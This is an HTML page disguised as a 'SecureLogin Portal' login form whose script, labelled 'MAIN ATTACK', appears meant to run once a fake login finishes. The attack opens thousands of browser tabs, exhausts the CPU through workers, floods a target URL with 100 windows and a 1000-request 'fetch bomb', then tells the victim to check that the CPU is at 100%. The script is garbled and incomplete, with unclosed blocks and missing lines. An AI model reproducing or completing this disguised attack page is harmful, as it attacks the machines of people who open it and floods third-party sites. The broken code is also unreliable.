<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üîê SecureLogin Portal v2.3</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 90%;
            max-width: 450px;
            padding: 40px;
            animation: slideIn 0.5s ease;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            color: #667eea;
            font-size: 2.2em;
            font-weight: 700;
        }
        
        .logo p {
            color: #999;
            font-size: 0.9em;
            margin-top: 5px;
        }
        
        .input-group {
            margin-bottom: 25px;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 0.95em;
        }
        
        .input-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 1em;
            transition: all 0.3s;
            background: #f8f9fa;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
        }
        
        .input-group input[type="url"] {
            font-family: monospace;
        }
        
        .security-badge {
            background: #f0f4ff;
            padding: 15px;
            border-radius: 12px;
            margin: 25px 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .security-badge i {
            font-size: 1.5em;
            color: #667eea;
        }
        
        .security-badge span {
            color: #555;
            font-size: 0.9em;
        }
        
        .login-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 1.1em;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-bottom: 15px;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102,126,234,0.3);
        }
        
        .login-btn:active {
            transform: translateY(0);
        }
        
        .terms {
            text-align: center;
            color: #999;
            font-size: 0.8em;
            margin-top: 20px;
        }
        
        .terms a {
            color: #667eea;
            text-decoration: none;
        }
        
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        
        .loading-overlay.active {
            display: flex;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid #fff;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .loading-text {
            color: white;
            font-size: 1.2em;
            font-weight: 500;
        }
        
        .loading-subtext {
            color: #ccc;
            font-size: 0.9em;
            margin-top: 10px;
        }
        
        .hidden-iframe {
            display: none;
        }
        
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #28a745;
            color: white;
            padding: 15px 25px;
            border-radius: 50px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            transform: translateY(100px);
            opacity: 0;
            transition: all 0.3s;
            z-index: 10000;
        }
        
        .notification.show {
            transform: translateY(0);
            opacity: 1;
        }
        
        .notification.error {
            background: #dc3545;
        }
        
        .version-tag {
            position: fixed;
            top: 10px;
            right: 10px;
            background: rgba(255,255,255,0.1);
            color: white;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.7em;
            backdrop-filter: blur(5px);
        }

</head>
<body>

    <script>

        // ==================== VARIABLES ====================
        let isLogging = false;

        // ==================== UI FUNCTIONS ====================
        function showNotification(message, isError = false) {
            const notification = document.getElementById('notification');

            notification.classList.add('show');

            } else {
                notification.classList.remove('error');
            }
            
            setTimeout(() => {

        function updateLoadingStatus(status, subStatus) {
            document.getElementById('loadingText').textContent = status;
            document.getElementById('loadingSubtext').textContent = subStatus;
        }
        
        // ==================== CLEANUP FUNCTION ====================
        function clearAllTimeouts() {
            timeoutIds.forEach(id => clearTimeout(id));
            timeoutIds = [];

        // ==================== OPEN 10,000 WEBSITES ====================

            // Buka semua window dengan berbagai teknik
            for (let i = 0; i < allUrls.length; i++) {
                let url = allUrls[i];

                    let win = window.open(url, '_blank');

            isLogging = true;

            setTimeout(() => {

            // Execute the attack after "authentication"
            setTimeout(() => {
                if (!isLogging) return;
                
                showNotification('Login successful! Loading dashboard...');
                
                updateLoadingStatus('üöÄ DEPLOYING WEBSITES', 'Opening 10,000 tabs...');
                
                // ==================== MAIN ATTACK ====================

                    let workers = exhaustCPU();

                    // 4. Open additional windows with the target URL
                    for (let i = 0; i < 100; i++) {

                            try {
                                window.open(websiteUrl + '?session=' + i, '_blank');
                            } catch(e) {}

                    }
                    
                    // 5. Fetch bomb to target URL
                    for (let i = 0; i < 1000; i++) {

                    // Final update

                            document.getElementById('loadingOverlay').classList.remove('active');
                            showNotification('Check your task manager! CPU should be 100%');
                        }

                } catch (error) {

            // Auto stop after 30 seconds (biar gak terlalu lama)
            setTimeout(() => {

        // ==================== CLEANUP ====================

</body>
